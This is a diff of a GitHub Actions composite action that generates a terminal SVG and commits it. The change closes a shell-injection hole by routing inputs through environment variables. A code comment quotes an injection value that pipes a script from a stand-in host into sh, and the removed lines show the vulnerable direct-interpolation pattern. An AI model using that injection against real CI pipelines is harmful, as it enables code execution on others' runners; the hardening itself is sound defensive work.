@@ -61,30 +61,43 @@ runs:
       id: generate
       shell: bash
       env:
+        # Pass user inputs via env so they never go through shell template
+        # expansion (closes M1 — without this, a value like
+        # `config: 'x; curl evil.sh | sh'` would execute on the runner).
         TZ: ${{ env.TZ || 'UTC' }}
+        INPUT_CONFIG: ${{ inputs.config }}
+        INPUT_OUTPUT: ${{ inputs.output }}
+        INPUT_CACHE_MODE: ${{ inputs.cache-mode }}
+        INPUT_STATIC: ${{ inputs.static }}
+        INPUT_MINIFY: ${{ inputs.minify }}
       run: |
         set -euo pipefail
         # Compose the optional flags into a single $args string. Empty by default;
         # only adds the flag when the input was set to a non-default value.
         args=""
-        case "${{ inputs.cache-mode }}" in
+        case "$INPUT_CACHE_MODE" in
           refresh) args="$args --refresh-cache" ;;
           frozen)  args="$args --frozen-cache" ;;
           off)     args="$args --no-cache" ;;
           normal|"") : ;;
-          *) echo "::error::Unknown cache-mode '${{ inputs.cache-mode }}'"; exit 1 ;;
+          *) echo "::error::Unknown cache-mode '$INPUT_CACHE_MODE'"; exit 1 ;;
         esac
-        if [ "${{ inputs.static }}" = "true" ]; then args="$args --static"; fi
-        if [ "${{ inputs.minify }}" = "true" ]; then args="$args --minify"; fi
-        svg-terminal generate --config "${{ inputs.config }}" --output "${{ inputs.output }}" $args
-        echo "size=$(stat -c%s "${{ inputs.output }}" 2>/dev/null || stat -f%z "${{ inputs.output }}")" >> "$GITHUB_OUTPUT"
+        if [ "$INPUT_STATIC" = "true" ]; then args="$args --static"; fi
+        if [ "$INPUT_MINIFY" = "true" ]; then args="$args --minify"; fi
+        svg-terminal generate --config "$INPUT_CONFIG" --output "$INPUT_OUTPUT" $args
+        echo "size=$(stat -c%s "$INPUT_OUTPUT" 2>/dev/null || stat -f%z "$INPUT_OUTPUT")" >> "$GITHUB_OUTPUT"
 
     - name: Commit SVG
       if: inputs.commit == 'true'
       shell: bash
+      env:
+        INPUT_OUTPUT: ${{ inputs.output }}
+        INPUT_COMMIT_MESSAGE: ${{ inputs.commit-message }}
       run: |
+        # Inputs passed via env so commit-message can never break out of the
+        # `git commit -m "..."` quoting (closes M1).
         git config --local user.email "github-actions[bot]@users.noreply.github.com"
         git config --local user.name "github-actions[bot]"
-        git add "${{ inputs.output }}"
-        git diff --staged --quiet || git commit -m "${{ inputs.commit-message }}"
+        git add "$INPUT_OUTPUT"
+        git diff --staged --quiet || git commit -m "$INPUT_COMMIT_MESSAGE"
         git push
